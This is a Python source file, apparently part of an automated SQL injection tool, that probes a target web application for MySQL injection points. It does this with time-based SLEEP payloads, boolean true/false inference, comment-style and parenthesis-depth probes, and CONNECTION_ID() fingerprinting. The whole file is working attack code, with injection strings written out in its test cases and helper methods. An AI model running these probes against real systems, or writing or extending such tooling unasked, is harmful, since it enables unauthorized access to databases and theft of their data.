import random
import re

class ContextDiscoverer:
    def __init__(self, client, disable_strings=False):
        self.client = client
        self.disable_strings = disable_strings
        self.detected_context = "UNKNOWN"
        self.comment_style = "-- -"
        self.wrappers = []

    def discover(self):
        print("[*] Phase: Context Discovery (The Dynamic Eye) active.", flush=True)
        
        # 1. Baseline Request
        baseline = self.client.send_request("1")
        baseline_time = baseline.get('latency', 500)
        
        # 2. Logic-Based Pulse Checking (Intelligent Context Discovery)
        print("  [?] Probing: Injection Point Identification...", flush=True)
        
        # We test different contexts with a time-based delay if possible, or boolean logic
        test_cases = [
            {"name": "NUMERIC", "payload": " AND SLEEP(2)", "verify": "AND 1=1"},
            {"name": "SINGLE_QUOTE", "payload": "' AND SLEEP(2) AND '1'='1", "verify": "' AND '1'='1"},
            {"name": "DOUBLE_QUOTE", "payload": "\" AND SLEEP(2) AND \"1\"=\"1", "verify": "\" AND \"1\"=\"1"},
            {"name": "PAREN_NUMERIC", "payload": ") AND SLEEP(2) AND (1=1", "verify": ") AND (1=1"},
            {"name": "PAREN_SINGLE_QUOTE", "payload": "') AND SLEEP(2) AND ('1'='1", "verify": "') AND ('1'='1"},
        ]

        found = False
        for case in test_cases:
            if self.disable_strings and ("'" in case['payload'] or "\"" in case['payload']):
                continue
                
            # Try Time-based probe first (most accurate for context)
            print(f"  [>] Testing context candidate: {case['name']}...", flush=True)
            res = self.client.send_request(case['payload'])
            
            # If latency > baseline + 1.5s, we likely found the context
            if res.get('latency', 0) > baseline_time + 1500:
                self.detected_context = case['name']
                found = True
                print(f"  [+] Match found via TIME-DELAY in {case['name']}", flush=True)
                break
            
            # Fallback: Boolean-based check if time fails
            res_bool = self.client.send_request(case['verify'])
            if len(res_bool['text']) == len(baseline['text']) and not self._check_sql_errors(res_bool['text']):
                # Double check with a FALSE condition
                false_payload = case['verify'].replace("1=1", "1=2").replace("\"1\"=\"1\"", "\"1\"=\"2\"").replace("'1'='1'", "'1'='2'")
                res_false = self.client.send_request(false_payload)
                if len(res_false['text']) != len(baseline['text']):
                    self.detected_context = case['name']
                    found = True
                    print(f"  [+] Match found via BOOLEAN-INFERENCE in {case['name']}", flush=True)
                    break

        if not found:
            print("  [!] Direct context matching failed. Attempting deep structural analysis...", flush=True)
            self._deep_structural_probe()
        
        # 3. Comment Style Discovery
        self._discover_comment_style()
        
        # 4. MySQL Fingerprinting
        db_type = self.fingerprint_mysql()
        
        return {
            "context": self.detected_context, 
            "db_type": db_type, 
            "comment_style": self.comment_style,
            "disable_strings": self.disable_strings
        }

    def _discover_comment_style(self):
        print("  [?] Probing: Comment Signature Discovery...", flush=True)
        styles = ["-- -", "#", "/*"]
        for s in styles:
            payload = f"1 AND 1=1 {s}"
            if self.detected_context == "SINGLE_QUOTE":
                payload = f"1' AND '1'='1' {s}"
            
            res = self.client.send_request(payload)
            if not self._check_sql_errors(res['text']):
                self.comment_style = s
                print(f"  [+] Detected Comment Style: {s}", flush=True)
                return

    def _deep_structural_probe(self):
        """Attempts to find deep parenthesis wraps like (('1'))"""
        for depth in range(1, 4):
            parens = ")" * depth
            payload = f"{parens} OR 1=1 -- -"
            res = self.client.send_request(payload)
            if not self._check_sql_errors(res['text']):
                self.detected_context = f"NUMERIC_PAREN_{depth}"
                return
            
            payload_sq = f"'{parens} OR '1'='1' -- -"
            res_sq = self.client.send_request(payload_sq)
            if not self._check_sql_errors(res_sq['text']):
                self.detected_context = f"QUOTE_PAREN_{depth}"
                return
        
        # Final fallback
        self.detected_context = "QUOTELESS_STRING" if self.disable_strings else "SINGLE_QUOTE"

    def fingerprint_mysql(self):
        """Exclusively validates and fingerprints MySQL environments."""
        print("[*] Phase: MySQL Validation Active.", flush=True)
        
        # MySQL specific probes:
        # CONNECTION_ID(), @@version, SLEEP()
        print(f"  [?] Checking for MySQL execution signature...", flush=True)
        
        # Safe logical check using purely MySQL functions
        logical_prefix = "" 
        if self.detected_context == "NUMERIC":
            logical_prefix = " AND "
        elif self.detected_context == "SINGLE_QUOTE":
            logical_prefix = "' AND "
        elif self.detected_context == "DOUBLE_QUOTE":
            logical_prefix = "\" AND "
        else:
            logical_prefix = " AND "
            
        # Verify CONNECTION_ID() executes without error and matches logic
        payload = f"{logical_prefix} CONNECTION_ID() IS NOT NULL -- -"
        
        res = self.client.send_request(payload)
        status = "MySQL (Confirmed)" if not self._check_sql_errors(res['text']) else "MySQL (Presumed)"
        print(f"  [+] Match found: Target is {status}", flush=True)
        return status

    def _check_sql_errors(self, text):
        # Optimized specifically for MySQL syntax errors
        error_patterns = [
            r"You have an error in your SQL syntax",
            r"mysql_fetch_",
            r"Warning: mysql_",
            r"Table '\w+' doesn't exist",
            r"Unknown column",
            r"SQL syntax.*MySQL",
            r"valid MySQL result"
        ]
        for pattern in error_patterns:
            if re.search(pattern, text, re.IGNORECASE):
                return True
        return False
